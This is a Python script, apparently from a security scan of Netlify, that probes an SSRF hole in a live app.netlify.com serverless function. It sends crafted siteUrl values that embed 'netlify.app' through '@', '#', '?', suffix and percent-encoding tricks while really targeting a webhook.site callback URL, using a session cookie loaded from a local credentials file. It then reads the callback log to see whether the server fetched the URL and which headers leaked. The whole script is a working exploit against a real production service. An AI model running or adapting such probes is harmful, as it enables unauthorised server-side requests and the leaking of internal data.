# -*- coding: utf-8 -*-
"""SSRF 域名校验强度:netlify.app 语义混淆变体
@/子域/# 等让字符串含 netlify.app 但实际请求外部"""
import http.client, ssl, gzip, brotli, json, sys, time, urllib.request
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A

ctx = ssl.create_default_context()
WH = 'https://webhook.site/6a0b6962-ec25-4725-b21c-bbae8bf899b6'  # 上个脚本的 uuid(继续用)


def post(site_url):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=35)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json', 'Cookie': COOKIE_A}
    t0 = time.time()
    conn.request('POST', '/.netlify/functions/fetch-extension-host-site-sdk-version',
                 body=json.dumps({'siteUrl': site_url}).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    out = raw[:200].decode('utf-8', 'ignore')
    dt = time.time() - t0
    conn.close()
    return st, dt, out


cases = [
    ('netlify.app@wh',       'http://sec-x.netlify.app@webhook.site/6a0b6962-ec25-4725-b21c-bbae8bf899b6'),
    ('wh#netlify.app',       'http://webhook.site/6a0b6962-ec25-4725-b21c-bbae8bf899b6#.netlify.app'),
    ('wh?.netlify.app',      'http://webhook.site/6a0b6962-ec25-4725-b21c-bbae8bf899b6?.netlify.app'),
    ('netlify.app.wh',       'http://sec-x.netlify.app.webhook.site/6a0b6962-ec25-4725-b21c-bbae8bf899b6'),
    ('percent@',             'http://sec-x.netlify.app%40webhook.site/6a0b6962-ec25-4725-b21c-bbae8bf899b6'),
    ('real netlify site B',  'http://sec-b-08v4pk.netlify.app'),
]
for label, u in cases:
    try:
        st, dt, out = post(u)
        print('%-22s [%d] %5.1fs %s' % (label, st, dt, out))
    except Exception as e:
        print('%-22s ERR %s' % (label, str(e)[:80]))

time.sleep(3)
req = urllib.request.Request('https://webhook.site/token/6a0b6962-ec25-4725-b21c-bbae8bf899b6/requests')
req.add_header('Accept', 'application/json')
with urllib.request.urlopen(req, timeout=20) as r:
    data = json.loads(r.read().decode())
reqs = data.get('data', [])
print('\n== 回调请求数: %d ==' % len(reqs))
for it in reqs[:10]:
    print('method:', it.get('method'), '| url:', it.get('url'))
    print('  headers:', json.dumps(it.get('headers', {}))[:400])
